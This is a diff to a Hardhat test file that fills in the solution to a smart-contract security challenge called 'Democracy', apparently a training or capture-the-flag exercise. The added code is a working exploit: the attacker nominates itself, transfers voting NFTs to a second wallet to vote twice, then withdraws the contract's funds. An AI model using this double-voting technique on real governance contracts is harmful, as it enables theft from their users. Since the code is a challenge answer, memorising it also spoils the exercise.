@@ -8,7 +8,7 @@ const { ethers } = require("hardhat");
 
 const NAME = "Democracy";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
   async function setup() {
       const [owner, attackerWallet] = await ethers.getSigners();
       const value = ethers.utils.parseEther("1");
@@ -26,7 +26,18 @@ describe(NAME, function () {
       })
 
       it("conduct your attack here", async function () {
-          
+          const signers = await ethers.getSigners();
+          const attackerWallet2 = signers[2];
+
+          await victimContract.nominateChallenger(attackerWallet.address);
+
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 0);
+          await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 1);
+          await victimContract.connect(attackerWallet2).vote(attackerWallet.address);
+
+          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
